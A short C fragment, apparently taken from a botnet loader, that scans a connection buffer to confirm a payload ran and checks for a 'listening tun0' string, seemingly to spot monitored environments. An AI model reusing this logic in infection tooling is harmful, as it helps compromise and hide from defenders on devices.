
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct connection {int rdbuf_pos; int rdbuf; } ;


 char* EXEC_RESPONSE ;
 int strlen (char*) ;
 int util_memsearch (int ,int,char*,int) ;

int connection_verify_payload(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
        return offset;
    else
        return 255 + offset;
}
